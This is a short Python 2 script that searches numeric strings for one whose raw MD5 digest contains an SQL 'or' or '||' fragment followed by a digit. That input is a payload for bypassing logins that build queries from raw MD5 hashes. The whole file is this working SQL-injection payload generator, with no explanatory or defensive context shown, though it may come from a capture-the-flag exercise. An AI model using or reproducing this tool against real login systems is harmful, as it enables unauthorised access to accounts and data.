import hashlib
import random
import string
import re

def randStrGenerator(charSet, length) :
	return ''.join(random.sample(charSet, length))	

def getmd5(inStr) :
	m = hashlib.md5()
	m.update(inStr)
	return m.digest()


def validAttack(attackStr):
	pos1 = attackStr.find("'||'")
	if pos1 >= 0:
		# valid
		return attackStr[pos1 + 4].isdigit()
	else:
		pos2 = attackStr.lower().find("'or'")
		if pos2 >= 0:
			return attackStr[pos2 + 4].isdigit()
		# valid
	return False

charset = string.lowercase + string.digits
length = 36



i = 129581926211651571912466741651878680000
time_elapsed = 0
while (1 == 1):
	if(i % 1000000 == 0):
		print "i now is = " + str(i)
	randStr = str(i)
	# print randStr
	# calc md5 hash
	md5hash = getmd5(randStr)
	# is this a valid attack ?
	i = i + 1	
	# print md5hash	
	if(validAttack(md5hash)):
		break

print "found valid attack"
print randStr

